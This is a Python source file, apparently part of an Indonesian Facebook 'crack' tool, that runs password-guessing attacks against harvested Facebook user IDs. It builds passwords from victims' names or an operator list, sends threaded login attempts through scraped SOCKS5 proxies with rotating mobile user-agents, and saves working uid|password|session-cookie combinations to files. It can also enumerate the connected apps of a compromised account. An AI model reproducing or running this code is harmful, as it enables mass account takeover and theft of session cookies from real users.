###----------[ IMPORT MODULE AND INGREDIENT ]---------- ###
import os, sys, re, time, requests, calendar, random, bs4, subprocess, uuid, json, threading,platform,string
from concurrent.futures import ThreadPoolExecutor
from bs4 import BeautifulSoup as parser
from datetime import date,datetime
from time import sleep
ses = requests.Session()
device = platform.platform()

###----------[ IMPORT RICH AND INGREDIENT ]---------- ###
from rich.panel import Panel
from rich.tree import Tree
from rich import print as prints
from rich.console import Console
from rich.table import Table
from rich.columns import Columns
from rich.progress import Progress,SpinnerColumn,BarColumn,TextColumn,TimeElapsedColumn
console = Console()

###----------[ IMPORT FILE FROM DIRECTORY ]---------- ###
from src import login as Login
from src import dump as Dump
from src import lain as Lain

###----------[ COLOR FOR PRINT ]---------- ###
P = '\x1b[1;97m' # PUTIH
M = '\x1b[1;91m' # MERAH
H = '\x1b[1;92m' # HIJAU
K = '\x1b[1;93m' # KUNING
B = '\x1b[1;94m' # BIRU
U = '\x1b[1;95m' # UNGU
O = '\x1b[1;96m' # BIRU MUDA
N = '\x1b[0m'	# WARNA MATI

###----------[ COLOR FOR RICH ]---------- ###
Z2 = "[#000000]" # HITAM
M2 = "[#FF0000]" # MERAH
H2 = "[#00FF00]" # HIJAU
K2 = "[#FFFF00]" # KUNING
B2 = "[#00C8FF]" # BIRU
U2 = "[#AF00FF]" # UNGU
N2 = "[#FF00FF]" # PINK
O2 = "[#00FFFF]" # BIRU MUDA
P2 = "[#FFFFFF]" # PUTIH
J2 = "[#FF8F00]" # JINGGA
A2 = "[#AAAAAA]" # ABU-ABU

###----------[ GLOBAL NAME ]---------- ###
ses = requests.Session()
loop = 0
id,id2,ok,cp = [],[],[],[]
mtd_dev = []
pwx = []
uasm = []
apk = []
azxc = []
pwd_time = int(datetime.now().timestamp())

###----------[ TIME ]---------- ###
now = datetime.now()
day = now.day
month = now.month
year = now.year
month_birthday = {"01": "January", "02": "February", "03": "March", "04": "April", "05": "May", "06": "June", "07": "July", "08": "August", "09": "September", "10": "October", "11": "November", "12": "December"}
month_cek = ["January", "February", "March", "April", "May", "June", "July", "August", "September", "October", "November", "December"]
try:
	if month < 0 or month > 12:
		exit()
	month_now = month - 1
except ValueError:exit()
_month_ = month_cek[month_now]
my_date = date.today()
day_now = calendar.day_name[my_date.weekday()]
date_now = ("%s-%s-%s-%s"%(day_now,day,_month_,year))

for x in range(1000):
	rr = random.randint
	rc = random.choice
	aZ = ['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z']
	ugent1 = f"Mozilla/5.0 (Linux; Android {str(rr(8,10))}; Redmi {str(rr(4,9))} Build/PPR1.{str(rr(111111,199999))}.011; en-us) AppleWebKit/537.36 (KHTML, like Gecko) UCBrowser/79.0.{str(rr(1111,9999))}.136 Mobile Safari/537.36 Puffin/9.7.2.{str(rr(11111,99999))}AP"
	if ugent1 in uasm:pass
	else:uasm.append(ugent1)
	ugent2 = f"Mozilla/5.0 (Linux; U; Android {str(rr(8,10))}; en-US; Redmi Note {str(rr(5,8))} Build/PKQ1.{str(rr(111111,199999))}.00{str(rr(1,9))} AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/100.0.{str(rr(1111,6666))}.2 UCBrowser/13.4.0.{str(rr(1111,6666))} Mobile Safari/537.36"
	if ugent2 in uasm:pass
	else:uasm.append(ugent2)
	ugent3 = f"Mozilla/5.0 (Linux; U; Android {str(rr(7,12))}; en-US; SM-{str(rc(aZ))}{str(rr(1111,9999))}{str(rc(aZ))}) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30 Mobile UCBrowser/3.4.3.{str(rr(111,999))}"
	if ugent3 in uasm:pass
	else:uasm.append(ugent3)

###----------[ CHECK THEME COLOR ]---------- ###
try:
	color_rich = open("data/color_rich.txt","r").read()
except FileNotFoundError:
	color_rich = "[#00C8FF]"
try:
	color_table = open("data/color_table.txt","r").read()
except FileNotFoundError:
	color_table = "#00C8FF"

###----------[ SETTING PASSWORD ]---------- ###
def setting_password(id):
	print("")
	prints(Panel(f"""{P2}succes collecting {len(id)} id""",width=80,padding=(0,23),style=f"{color_table}"))
	set = input(f" {N}do you want to use manual password?[y/n] : ")
	if set in["y","Y"]:
		manual(id)
	else:
		otomatis(id)
	
def aturutuan(id):
	urut = []
	urut.append(Panel(f"{P2}[{color_rich}01{P2}]. id old to new",width=24,style=f"{color_table}"))
	urut.append(Panel(f"{P2}[{color_rich}02{P2}]. id new to old",width=24,style=f"{color_table}"))
	urut.append(Panel(f"{P2}[{color_rich}03{P2}]. id random",width=25,style=f"{color_table}"))
	console.print(Columns(urut))
	ask = input(f" {N}choose your choice : ")
	if ask in["1"]:
		id.sort()
		for urutan in id:
			id2.append(urutan)
	elif ask in["2"]:
		for urutan in id:
			id2.insert(0,urutan)
	elif ask in["3"]:
		for urutan in id:
			xx = random.randint(0,len(id2))
			id2.insert(xx,urutan)

def manual(id):
	prints(Panel(f"""{P2}create a many password using a comma (,) as a separator""",width=80,style=f"{color_table}"))
	pwx = input(f" {N}create password : ")
	if len(pwx)<=5:
		prints(Panel(f"""{P2}please create a password with at least 6 letters or more""",width=80,style=f"{color_table}"))
		sys.exit()
	aturutuan(id)
	prints(Panel(f"""{P2}if it appears will make the crack process slower, recommended select n""",width=80,style=f"{color_table}"))
	apli = input(f" {N}do you want to show applications when crack?[y/n] : ")
	if apli in["Y","y"]:
		apk.append("show")
	else:
		pass
	azxc.append(Panel(f"""{P2}[{color_rich}01{P2}]. metode freefb
[{color_rich}02{P2}]. metode mbasic
[{color_rich}03{P2}]. metode mobile""",width=37,title=f"{P2}metode reguler",style=f"{color_table}"))
	azxc.append(Panel(f"""{P2}[{color_rich}04{P2}]. metode freefb
[{color_rich}05{P2}]. metode mbasic
[{color_rich}06{P2}]. metode mobile""",width=37,title=f"{P2}metode validate",style=f"{color_table}"))
	console.print(Columns(azxc))
	log = input(f" {N}choose your url login : ")
	if log in["1","01"]:
		mtd_dev.append("free")
		setting_proxy()
		manual_reguler(pwx)
	elif log in["2","02"]:
		mtd_dev.append("mbasic")
		setting_proxy()
		manual_reguler(pwx)
	elif log in["3","03"]:
		mtd_dev.append("mobile")
		setting_proxy()
		manual_reguler(pwx)
	elif log in["4","04"]:
		mtd_dev.append("free")
		setting_proxy()
		manual_validate(pwx)
	elif log in["5","05"]:
		mtd_dev.append("mbasic")
		setting_proxy()
		manual_validate(pwx)
	elif log in["6","06"]:
		mtd_dev.append("mobile")
		setting_proxy()
		manual_validate(pwx)

###----------[ PASSWORD OTOMATIS ]---------- ###
def otomatis(id):
	aturutuan(id)
	prints(Panel(f"""{P2}if it appears will make the crack process slower, recommended select n""",width=80,style=f"{color_table}"))
	apli = input(f" {N}do you want to show applications when crack?[y/n] : ")
	if apli in["Y","y"]:
		apk.append("show")
	else:
		pass
	azxc.append(Panel(f"""{P2}[{color_rich}01{P2}]. metode freefb
[{color_rich}02{P2}]. metode mbasic
[{color_rich}03{P2}]. metode mobile""",width=37,title=f"{P2}metode reguler",style=f"{color_table}"))
	azxc.append(Panel(f"""{P2}[{color_rich}04{P2}]. metode freefb
[{color_rich}05{P2}]. metode mbasic
[{color_rich}06{P2}]. metode mobile""",width=37,title=f"{P2}metode validate",style=f"{color_table}"))
	console.print(Columns(azxc))
	log = input(f" {N}choose your url login : ")
	if log in["1","01"]:
		mtd_dev.append("free")
		setting_proxy()
		otomatis_reguler()
	elif log in["2","02"]:
		mtd_dev.append("mbasic")
		setting_proxy()
		otomatis_reguler()
	elif log in["3","03"]:
		mtd_dev.append("mobile")
		setting_proxy()
		otomatis_reguler()
	elif log in["4","04"]:
		mtd_dev.append("free")
		setting_proxy()
		otomatis_validate()
	elif log in["5","05"]:
		mtd_dev.append("mbasic")
		setting_proxy()
		otomatis_validate()
	elif log in["6","06"]:
		mtd_dev.append("mobile")
		setting_proxy()
		otomatis_validate()
	
def setting_proxy():
	prints(Panel(f"""{P2}if you choose n it will use the previous proxy that already exists""",width=80,style=f"{color_table}"))
	pr = input(f" {N}do you want to use the latest proxy?[y/n] : ")
	if pr in["y","Y"]:
		try:
			url = ses.get('https://api.proxyscrape.com/?request=displayproxies&protocol=socks5&timeout=10000&country=all&ssl=all&anonymity=all').text
			open("data/proxy.txt","w").write(url)
		except:pass
	else:
		pass

###----------[ GENERATE PASSWORD MANUAL ]---------- ###
def manual_reguler(pwz):
	global prog,des
	prog = Progress(SpinnerColumn('clock'),TextColumn('{task.description}'),BarColumn(),TextColumn('{task.percentage:.0f}%'),TimeElapsedColumn())
	des = prog.add_task('',total=len(id2))
	with prog:
		with ThreadPoolExecutor(max_workers=30) as fall:
			saveresulst()
			for user in id2:
				try:
					pwx = []
					uid  = user.split("<=>")[0]
					name = user.split("<=>")[1]
					for z in pwz.split(","):
						pwx.append(z)
					if "free" in mtd_dev:
						fall.submit(metode_reguler,uid,pwx,"free.facebook.com")
					elif "mbasic" in mtd_dev:
						fall.submit(metode_reguler,uid,pwx,"mbasic.facebook.com")
					elif "mobile" in mtd_dev:
						fall.submit(metode_reguler,uid,pwx,"m.facebook.com")
				except Exception as e:
					if "free" in mtd_dev:
						fall.submit(metode_reguler,uid,pwx,"free.facebook.com")
					elif "mbasic" in mtd_dev:
						fall.submit(metode_reguler,uid,pwx,"mbasic.facebook.com")
					elif "mobile" in mtd_dev:
						fall.submit(metode_reguler,uid,pwx,"m.facebook.com")
	prints(Panel(f"""{P2}successfully cracked {len(id2)} id, with result OK : {H2}{len(ok)}{P2} CP : {K2}{len(cp)}{P2}""",width=80,padding=(0,8),style=f"{color_table}"))
	sys.exit()
	
def manual_validate(pwz):
	global prog,des
	prog = Progress(SpinnerColumn('clock'),TextColumn('{task.description}'),BarColumn(),TextColumn('{task.percentage:.0f}%'),TimeElapsedColumn())
	des = prog.add_task('',total=len(id2))
	with prog:
		with ThreadPoolExecutor(max_workers=30) as fall:
			saveresulst()
			for user in id2:
				try:
					pwx = []
					uid  = user.split("<=>")[0]
					name = user.split("<=>")[1]
					for z in pwz.split(","):
						pwx.append(z)
					if "free" in mtd_dev:
						fall.submit(metode_validate,uid,pwx,"free.facebook.com")
					elif "mbasic" in mtd_dev:
						fall.submit(metode_validate,uid,pwx,"mbasic.facebook.com")
					elif "mobile" in mtd_dev:
						fall.submit(metode_validate,uid,pwx,"m.facebook.com")
				except Exception as e:
					if "free" in mtd_dev:
						fall.submit(metode_validate,uid,pwx,"free.facebook.com")
					elif "mbasic" in mtd_dev:
						fall.submit(metode_validate,uid,pwx,"mbasic.facebook.com")
					elif "mobile" in mtd_dev:
						fall.submit(metode_validate,uid,pwx,"m.facebook.com")
	prints(Panel(f"""{P2}successfully cracked {len(id2)} id, with result OK : {H2}{len(ok)}{P2} CP : {K2}{len(cp)}{P2}""",width=80,padding=(0,8),style=f"{color_table}"))
	sys.exit()

###----------[ GENERATE PASSWORD OTOMATIS ]----------###
def otomatis_reguler():
	global prog,des
	prog = Progress(SpinnerColumn('clock'),TextColumn('{task.description}'),BarColumn(),TextColumn('{task.percentage:.0f}%'),TimeElapsedColumn())
	des = prog.add_task('',total=len(id2))
	with prog:
		with ThreadPoolExecutor(max_workers=30) as fall:
			saveresulst()
			for user in id2:
				try:
					pwx = []
					uid,nama = user.split('<=>')[0],user.split('<=>')[1].lower()
					depan = nama.split(" ")[0]
					if len(nama)<=5:
						if len(depan)<3:
							pass 
						else:
							pwx.append(depan+"123")
							pwx.append(depan+"12345")
					else:
						if len(depan)<3:
							pwx.append(nama)
						else:
							pwx.append(nama)
							pwx.append(depan+"123")
							pwx.append(depan+"12345")
					if "free" in mtd_dev:
						fall.submit(metode_reguler,uid,pwx,"free.facebook.com")
					elif "mbasic" in mtd_dev:
						fall.submit(metode_reguler,uid,pwx,"mbasic.facebook.com")
					elif "mobile" in mtd_dev:
						fall.submit(metode_reguler,uid,pwx,"m.facebook.com")
				except Exception as e:
					if "free" in mtd_dev:
						fall.submit(metode_reguler,uid,pwx,"free.facebook.com")
					elif "mbasic" in mtd_dev:
						fall.submit(metode_reguler,uid,pwx,"mbasic.facebook.com")
					elif "mobile" in mtd_dev:
						fall.submit(metode_reguler,uid,pwx,"m.facebook.com")
	prints(Panel(f"""{P2}successfully cracked {len(id2)} id, with result OK : {H2}{len(ok)}{P2} CP : {K2}{len(cp)}{P2}""",width=80,padding=(0,8),style=f"{color_table}"))
	sys.exit()
	
def otomatis_validate():
	global prog,des
	prog = Progress(SpinnerColumn('clock'),TextColumn('{task.description}'),BarColumn(),TextColumn('{task.percentage:.0f}%'),TimeElapsedColumn())
	des = prog.add_task('',total=len(id2))
	with prog:
		with ThreadPoolExecutor(max_workers=30) as fall:
			saveresulst()
			for user in id2:
				try:
					pwx = []
					uid,nama = user.split('<=>')[0],user.split('<=>')[1].lower()
					depan = nama.split(" ")[0]
					if len(nama)<=5:
						if len(depan)<3:
							pass 
						else:
							pwx.append(depan+"123")
							pwx.append(depan+"12345")
					else:
						if len(depan)<3:
							pwx.append(nama)
						else:
							pwx.append(nama)
							pwx.append(depan+"123")
							pwx.append(depan+"12345")
					if "free" in mtd_dev:
						fall.submit(metode_validate,uid,pwx,"free.facebook.com")
					elif "mbasic" in mtd_dev:
						fall.submit(metode_validate,uid,pwx,"mbasic.facebook.com")
					elif "mobile" in mtd_dev:
						fall.submit(metode_validate,uid,pwx,"m.facebook.com")
				except Exception as e:
					if "free" in mtd_dev:
						fall.submit(metode_validate,uid,pwx,"free.facebook.com")
					elif "mbasic" in mtd_dev:
						fall.submit(metode_validate,uid,pwx,"mbasic.facebook.com")
					elif "mobile" in mtd_dev:
						fall.submit(metode_validate,uid,pwx,"m.facebook.com")
	prints(Panel(f"""{P2}successfully cracked {len(id2)} id, with result OK : {H2}{len(ok)}{P2} CP : {K2}{len(cp)}{P2}""",width=80,padding=(0,8),style=f"{color_table}"))
	sys.exit()
    
###----------[ METODE CRACK ]---------- ###
def metode_reguler(user, pwx, url):
	global ok,cp,loop
	ua = random.choice(uasm)
	prox = open("data/proxy.txt","r").read().splitlines()
	prog.update(des,description=f"crack {str(loop)}/{len(id2)} OK : {H}{len(ok)}{N} CP : {K}{len(cp)}{N}")
	prog.advance(des)
	for pw in pwx:
		try:
			pw = pw.lower()
			ses=requests.Session()
			proxy= {"http": "socks5://{random.choice(prox)}"}
			headers1= {
				"Host":url,
				"upgrade-insecure-requests":"1",
				"user-agent":ua,
				"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","dnt":"1",
				"x-requested-with":"com.facebook.katana",
				"sec-fetch-site":"same-origin",
				"sec-fetch-mode":"cors",
				"sec-fetch-user":"empty",
				"sec-fetch-dest":"document",
				"referer":f"https://{url}/",
				"accept-encoding":"gzip, deflate br",
				"accept-language":"en-GB,en-US;q=0.9,en;q=0.8"
				}
			p = ses.get(f"https://{url}/login/?next&ref=dbl&fl&refid=8",headers=headers1)
			data = {
				"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),
				"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),
				"email":user,
				"pass":pw
				}
			#cookie = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
			#cookie += " m_pixel_ratio=2.625; wd=412x756"
			headers2 = {
				"Host": url,
				"cache-control":"max-age=0",
				"upgrade-insecure-requests":"1",
				"origin":f"https://{url}",
				"content-type":"application/x-www-form-urlencoded",
				"user-agent":ua,
				"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
				"x-requested-with":"com.facebook.katana",
				"sec-fetch-site":"same-origin",
				"sec-fetch-mode":"cors",
				"sec-fetch-user":"empty",
				"sec-fetch-dest":"document",
				'referer':f'https://{url}/login/?next&ref=dbl&fl&refid=8',
				"accept-encoding":"gzip, deflate br",
				"accept-language":"en-GB,en-US;q=0.9,en;q=0.8"
				}
			po = ses.post(f"https://{url}/login/device-based/regular/login/?refsrc=deprecated&lwv=100&ref=dbl",data=data, headers=headers2, proxies=proxy)
			if "c_user" in ses.cookies.get_dict():
				ok.append(user)
				coki = convert(ses.cookies.get_dict())
				user = re.findall('c_user=(.*);xs', coki)[0]
				if "show" in apk:
					get_apk(user,pw,coki)
				else:
					tree = Tree("                                 ")
					tree.add(f"\r{H}{user}|{pw}{P} ")
					tree.add(f"{H}{coki}{N}")
					prints(tree)
				open("OK/%s.txt"%(date_now),"a").write("  * --> %s|%s|%s\n"%(user, pw,coki))
				break
			elif "checkpoint" in ses.cookies.get_dict():
				user = ses.cookies.get_dict()["checkpoint"].split("%")[4].replace("3A", "")
				cp.append(user)
				tree = Tree("                                 ")
				tree.add(f"\r{K}{user}|{pw}{P} ")
				prints(tree)
				open("CP/%s.txt"%(date_now),"a").write("  * --> %s|%s\n"%(user, pw))
				break
		except requests.exceptions.ConnectionError:
			sleep(32)

	loop+=1
	
def metode_validate(user, pwx, url):
	global ok,cp,loop
	ua = random.choice(uasm)
	prox = open("data/proxy.txt","r").read().splitlines()
	prog.update(des,description=f"crack {str(loop)}/{len(id2)} OK : {H}{len(ok)}{N} CP : {K}{len(cp)}{N}")
	prog.advance(des)
	for pw in pwx:
		try:
			pw = pw.lower()
			ses=requests.Session()
			proxy= {"http": "socks5://{random.choice(prox)}"}
			headers1= {
				"Host": url,
				"cache-control": "max-age=0",
				"user-agent": ua,
				"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
				"sec-ch-ua": '" Not A;Brand";v="99", "Chromium";v="101"',
				"sec-ch-ua-mobile": "?1",
				"sec-fetch-site": "same-origin",
				"sec-fetch-mode": "cors",
				"sec-fetch-dest": "empty",
				"sec-fetch-user": "?1",
				"upgrade-insecure-requests": "1",
				"accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"}
			p = ses.get(f"https://{url}/login/device-based/password/?uid={user}&flow=login_no_pin&next=https%3A%2F%2F{url}%2Fv2.3%2Fdialog%2Foauth%3Fapp_id%3D124024574287414%26cbt%3D1651658200978%26e2e%3D%257B%2522init%2522%253A1651658200978%257D%26sso%3Dchrome_custom_tab%26scope%3Demail%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D%26redirect_uri%3Dfbconnect%253A%252F%252Fcct.com.instathunder.app%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%252Cgranted_scopes%26return_scopes%3Dtrue%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D68f15bae-23f8-463c-8660-5cf1226d97f6%26tp%3Dunspecified&cancel_url=fbconnect%3A%2F%2Fcct.com.instathunder.app%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr",headers=headers1)
			data = {
				"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),
				"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),
				"uid":user,
				"next":f"https://{url}/v2.3/dialog/oauth?app_id=124024574287414&cbt=1651658200978&e2e=%7B%22init%22%3A1651658200978%7D&sso=chrome_custom_tab&scope=email&state=%7B%220_auth_logger_id%22%3A%2268f15bae-23f8-463c-8660-5cf1226d97f6%22%2C%227_challenge%22%3A%22dahj28hqtietmhrgprpp%22%2C%223_method%22%3A%22custom_tab%22%7D&redirect_uri=fbconnect%3A%2F%2Fcct.com.instathunder.app&response_type=token%2Csigned_request%2Cgraph_domain%2Cgranted_scopes&return_scopes=true&ret=login&fbapp_pres=0&logger_id=68f15bae-23f8-463c-8660-5cf1226d97f6&tp=unspecified",
				"pass":pw,
				"flow":"login_no_pin"}
			cookie = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
			cookie += " m_pixel_ratio=2.625; wd=412x756"
			headers2 = {
				"Host": url,
				"connection": "keep-alive",
				"cache-control": "max-age=0",
				"save-data": "on",
				"origin": "https://m.facebook.com",
				"content-type": "application/x-www-form-urlencoded",
				"user-agent": ua,
				"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
				"x-requested-with": "com.facebook.katana",
				"dnt": "1",
				"sec-ch-ua": '" Not A;Brand";v="99", "Chromium";v="101"',
				"sec-ch-ua-platform": '"Android"',
				"sec-ch-ua-mobile": "?1",
				"sec-fetch-site": "same-origin",
				"sec-fetch-mode": "cors",
				"sec-fetch-dest": "empty",
				"sec-fetch-user": "?1",
				"upgrade-insecure-requests": "1",
				"referer": f"https://{url}/login/device-based/password/?uid={user}&flow=login_no_pin&next=https%3A%2F%2F{url}%2Fv2.3%2Fdialog%2Foauth%3Fapp_id%3D124024574287414%26cbt%3D1651658200978%26e2e%3D%257B%2522init%2522%253A1651658200978%257D%26sso%3Dchrome_custom_tab%26scope%3Demail%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D%26redirect_uri%3Dfbconnect%253A%252F%252Fcct.com.instathunder.app%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%252Cgranted_scopes%26return_scopes%3Dtrue%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D68f15bae-23f8-463c-8660-5cf1226d97f6%26tp%3Dunspecified&cancel_url=fbconnect%3A%2F%2Fcct.com.instathunder.app%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr",
				"accept-encoding": "gzip, deflate br",
				"accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"}
			po = ses.post(f"https://{url}/login/device-based/validate-password/?shbl=0&locale2=id_ID",data=data, headers=headers2, cookies={"cookie": cookie}, proxies=proxy, allow_redirects=False)
			if "c_user" in ses.cookies.get_dict():
				ok.append(user)
				coki = convert(ses.cookies.get_dict())
				user = re.findall('c_user=(.*);xs', coki)[0]
				if "show" in apk:
					get_apk(user,pw,coki)
				else:
					tree = Tree("                                 ")
					tree.add(f"\r{H}{user}|{pw}{P} ")
					tree.add(f"{H}{coki}{N}")
					prints(tree)
				open("OK/%s.txt"%(date_now),"a").write("  * --> %s|%s|%s\n"%(user, pw,coki))
				break
			elif "checkpoint" in ses.cookies.get_dict():
				user = ses.cookies.get_dict()["checkpoint"].split("%")[4].replace("3A", "")
				cp.append(user)
				tree = Tree("                                 ")
				tree.add(f"\r{K}{user}|{pw}{P} ")
				prints(tree)
				open("CP/%s.txt"%(date_now),"a").write("  * --> %s|%s\n"%(user, pw))
				break
		except requests.exceptions.ConnectionError:
			sleep(32)
	loop+=1
		
###----------[ CONVET LANGUAGE ]---------- ###
def language(cookie):
	try:
		url = ses.get('https://mbasic.facebook.com/language/',cookies=cookie)
		data = parser(url.text,'html.parser')
		for x in data.find_all('form',{'method':'post'}):
			if 'Bahasa Indonesia' in str(x):
				bahasa = {"fb_dtsg" : re.search('name="fb_dtsg" value="(.*?)"',str(url.text)).group(1),"jazoest" : re.search('name="jazoest" value="(.*?)"', str(url.text)).group(1),"submit"  : "Bahasa Indonesia"}
				eksekusi = ses.post('https://mbasic.facebook.com' + x['action'],data=bahasa,cookies=cookie)
	except:pass

###----------[ GET APK FROM COOKIE ]---------- ###
def get_apk(user,pw,cok):
	cookie = {"cookie":cok}
	language(cookie)
	tree = Tree("                                 ")
	tree.add(f"\r{H}{user}|{pw}{N} ")
	tree.add(f"\r{H}{cok}{N}")
	try:
		active = Tree(f"\r{N}active application :")
		url = "https://mbasic.facebook.com/settings/apps/tabbed/?tab=active"
		get_active(url,active,cookie)
	except Exception as e:
		print(e)
	try:
		inactive = Tree(f"\r{N}inactive application :")
		url = "https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive"
		get_inactive(url,inactive,cookie)
	except Exception as e:
		print(e)
	tree.add(active)
	tree.add(inactive)
	prints(tree)
		
###----------[ GET APK ACTIVE ]---------- ###
def get_active(url,active,cookie):
	try:
		data = parser(ses.get(url,cookies=cookie).text,"html.parser")
		for apk in data.find_all("h3"):
			if "Ditambahkan" in apk.text:
				active.add(f"\r{H}{str(apk.text).replace('Ditambahkan',' Ditambahkan')}{N}")
			else:continue
		next = "https://mbasic.facebook.com" + data.find("a",string="Lihat Lainnya")["href"]
		get_active(next,active,cookie)
	except:pass

###----------[ GET APK INACTIVE ]---------- ###
def get_inactive(url,inactive,cookie):
	try:
		data = parser(ses.get(url,cookies=cookie).text,"html.parser")
		for apk in data.find_all("h3"):
			if "Kedaluwarsa" in apk.text:
				inactive.add(f"\r{M}{str(apk.text).replace('Kedaluwarsa',' Kedaluwarsa')}{N}")
			else:continue
		next = "https://mbasic.facebook.com" + data.find("a",string="Lihat Lainnya")["href"]
		get_inactive(next,inactive,cookie)
	except:pass

###----------[ CONVERT COOKIE ]---------- ###
def convert(cookie):
	cok = ('sb=%s;datr=%s;c_user=%s;xs=%s;fr=%s'%(cookie['sb'],cookie['datr'],cookie['c_user'],cookie['xs'],cookie['fr']))
	return(str(cok))
	
###----------[ PRINT SAVE RESULTS ]---------- ###
def saveresulst():
	prints(Panel(f"""\r{P2}results acoount ok saved to : {date_now}
results acoount cp saved to : {date_now}""",width=80,padding=(0,10),style=f"{color_table}"))
